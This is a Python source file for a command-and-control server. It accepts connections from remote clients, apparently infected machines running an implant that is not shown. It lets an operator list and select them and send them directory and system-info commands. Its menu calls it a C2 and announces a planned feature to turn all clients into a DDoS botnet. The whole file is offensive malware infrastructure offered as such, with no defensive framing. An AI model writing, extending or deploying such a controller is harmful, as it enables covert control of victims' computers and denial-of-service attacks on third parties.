import socket
import threading


clients_list = []

current_conn = None
current_addr = None


    
def accept_connections(s):
   
    global clients_list
    while True:
        try:
            conn, addr = s.accept()
            clients_list.append((conn, addr))
            print(f"\n[+] Client connected from {addr}")
            print(">>> ", end="") 
        except Exception as e:
           
            break

def start():
    SERVER = str(input("Enter ip >> ").strip())
    PORT = int(input("Enter port >> ").strip())
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((SERVER, PORT))
    s.listen()
    print("[+] Waiting for clients...")
    
    
    t = threading.Thread(target=accept_connections, args=(s,), daemon=True)
    t.start()

def banner():
   command = """
---------------------------------------------------
------>           [ c2 Command ]            <------
---------------------------------------------------
0.help      --> Show list command
1.ls        --> File list                                
2.cd        --> Change Directory
3.pwd       --> Show working Directory
4.client    --> List all connected clients
5.select    --> Select a client to control (e.g., select 0)
6.DDoss     --> use all client to DDoss (in future)
7.sysinfo   --> Show system info
"""
   print(command)

def exe():
    global current_conn, current_addr, clients_list
    while True:
        
        target_name = current_addr[0] if current_addr else "C2"
        com = input(f"[{target_name}] >>> ").strip()
        
        if not com:
            continue
            
        
        if com == "client":
            print("\n--- Connected Clients ---")
            
            for index, (conn, addr) in enumerate(clients_list):
                print(f"[{index}] - IP: {addr[0]} | Port: {addr[1]}  ")
            print("-------------------------\n")
            continue
            
     
        elif com.startswith("select "):
            try:
                target_index = int(com.split(" ")[1])
                current_conn, current_addr = clients_list[target_index]
                print(f"[+] Controlling {current_addr}")
            except (ValueError, IndexError):
                print("[-] Invalid client index.")
            continue

        
        if current_conn is None:
            print("[-] No client selected. Use 'client' and 'select <index>' first.")
            continue

        try:
            if com == "ls":
                current_conn.sendall("ls".encode('utf-8'))
                data = current_conn.recv(4096).decode('utf-8')
                print(data)
            elif com == "pwd":
                current_conn.sendall("pwd".encode('utf-8'))
                data = current_conn.recv(4096).decode('utf-8')
                print(data)
            elif com == "sysinfo":
                current_conn.sendall("sysinfo".encode('utf-8'))
                data = current_conn.recv(4096).decode('utf-8')
                print(data)
            elif com.startswith("cd ") or com == "cd":
                current_conn.sendall(com.encode('utf-8'))
                data = current_conn.recv(4096).decode('utf-8')
                print(data)
            elif com.lower() == "help" :
                banner()
            
            else:
                print("[-] Unknown command.")
        except (ConnectionResetError, BrokenPipeError):
            print(f"[-] Client {current_addr} disconnected contextually.")
            
            if (current_conn, current_addr) in clients_list:
                clients_list.remove((current_conn, current_addr))
            current_conn = None
            current_addr = None

def main():
   start()
   banner()
   exe()
   
if __name__ == "__main__":
   main()
